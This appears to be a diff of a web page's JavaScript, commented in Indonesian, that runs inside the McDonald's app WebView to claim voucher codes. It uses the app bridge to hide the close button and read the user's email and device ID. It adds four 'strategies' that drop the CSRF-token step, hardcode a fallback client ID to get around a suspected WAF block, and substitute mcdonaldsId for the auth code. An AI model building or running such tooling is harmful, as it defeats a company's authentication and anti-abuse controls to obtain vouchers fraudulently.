+              log("JWT belum ada, ambil dulu...", "warn");
+              try {
+                await getAuthCode();
+              } catch (e) {
+                return;
+              }
             }
+            await strategyFormTop(v, jwtAuthCode);
+          });
 
-            clicked = false;
-            this.disabled = false;
-            this.textContent = "START CLAIM";
+        document
+          .getElementById("strategy-mcdid")
+          .addEventListener("click", async function () {
+            var v = (document.getElementById("voucher-input").value || "")
+              .trim()
+              .toUpperCase();
+            if (!v) {
+              log("Isi voucher dulu", "warn");
+              return;
+            }
+            await strategyMcdId(v);
+          });
+
+        document
+          .getElementById("clear-iframe")
+          .addEventListener("click", function () {
+            document.getElementById("responseFrame").src = "about:blank";
           });
 
         // ============ MAIN: mcdBridgeReady ============
         document.addEventListener("mcdBridgeReady", async function () {
-          log("Event mcdBridgeReady fired — bridge siap", "ok");
+          log("mcdBridgeReady fired", "ok");
           setBridgeStatus("on");
           bridgeReady = true;
 
-          // Hide nav & close like offer.js does
+          // Hide McD UI
           try {
             var system = mcd.bridge.message("system");
             system.send({ hideNavigationbar: true, hideCloseButton: true });
-            log(
-              'Bridge call: channel="system", payload={hideNavigationbar:true, hideCloseButton:true}',
-              "info",
-            );
-          } catch (e) {
-            log("Gagal hide system UI: " + e, "warn");
-          }
+            log("system.send hideNavigationbar + hideCloseButton", "info");
+          } catch (e) {}
 
-          // Step 1: CSRF
-          await fetchCsrfToken();
+          // clientId pakai fallback (cas/configuration kemungkinan WAF block)
+          clientId = FALLBACK_CLIENT_ID;
+          log("clientId pakai fallback: " + clientId, "warn");
 
-          // Step 2: Client ID
-          await getClientId();
-
-          // Step 3: User data dari bridge
+          // Get user data
           try {
             await getUserData();
           } catch (e) {
-            log("Gagal ambil user data (mungkin belum login)", "fail");
+            log("Gagal ambil user data", "fail");
           }
 
-          // Enable button kalau semua prerequisite siap
-          if (clientId && email && deviceId && csrfToken) {
-            document.getElementById("start-btn").disabled = false;
-            log("=== SIAP KLAIM — tombol aktif ===", "ok");
-          } else {
-            log("Prerequisite belum lengkap, tombol masih disabled", "fail");
+          // Enable strategy buttons (semua strategy butuh email+deviceId)
+          if (email && deviceId) {
+            enableStrategyButtons(true);
+            log("=== SIAP — pilih strategy di bawah ===", "ok");
             log(
-              "clientId: " +
-                (clientId ? "OK" : "MISSING") +
-                ", email: " +
-                (email ? "OK" : "MISSING") +
-                ", deviceId: " +
-                (deviceId ? "OK" : "MISSING") +
-                ", csrfToken: " +
-                (csrfToken ? "OK" : "MISSING"),
-              "warn",
+              "Strategy 1: fetch no-cors (fire & forget, cek app McD)",
+              "info",
             );
+            log(
+              "Strategy 2: Form ke iframe (response di kotak putih bawah)",
+              "info",
+            );
+            log(
+              "Strategy 3: Form ke _top (navigasi WebView, lihat hasil fullscreen)",
+              "info",
+            );
+            log(
+              "Strategy 4: Form pakai mcdonaldsId sbg authCode (skip getAuthCode)",
+              "info",
+            );
+          } else {
+            log("email/deviceId belum lengkap", "fail");
           }
         });
 
-        // ============ FALLBACK: kalau bridge sudah ready sebelum listener dipasang ============
+        // Fallback kalau bridge sudah ready sebelum listener dipasang
         if (getBridgeRoot()) {
-          log(
-            "Bridge sudah tersedia sebelum event listener, trigger manual",
-            "warn",
-          );
+          log("Bridge sudah tersedia, trigger manual", "warn");
           setTimeout(function () {
             if (!bridgeReady) {
               document.dispatchEvent(new Event("mcdBridgeReady"));
@@ -679,9 +984,13 @@
           }, 500);
         }
 
-        // Initial log
         log("Page loaded. Base URL: " + BASE_URL, "sys");
-        log("Menunggu event mcdBridgeReady...", "sys");
+        log("Fallback clientId: " + FALLBACK_CLIENT_ID, "sys");
+        log("Menunggu mcdBridgeReady...", "sys");
+        log(
+          "Tip: kalau fetch /cas/* gagal, pakai Strategy 2 atau 3 (form)",
+          "warn",
+        );
       })();
     </script>
   </body>
